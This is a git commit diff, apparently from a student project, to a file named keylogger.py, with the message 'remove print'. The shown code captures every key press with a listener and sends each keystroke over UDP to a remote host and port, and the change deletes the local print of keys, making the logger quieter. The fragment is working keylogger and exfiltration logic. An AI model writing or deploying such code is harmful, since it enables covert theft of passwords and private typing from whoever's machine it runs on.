d731b5b643cdb88831cc18dee1762d626167364d
Deric Mccadden <dmccadden@my.bcit.ca>
2018-10-31 18:25:23 -0700

    remove print

--- keylogger.py
+++ keylogger.py
@@ -11,7 +11,6 @@ sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 server_address = (host, port)
 
 def on_press(key):
-    print(key) 
     sock.sendto(str(key).encode('utf-8'), server_address)
 
 with Listener(on_press=on_press) as listener:
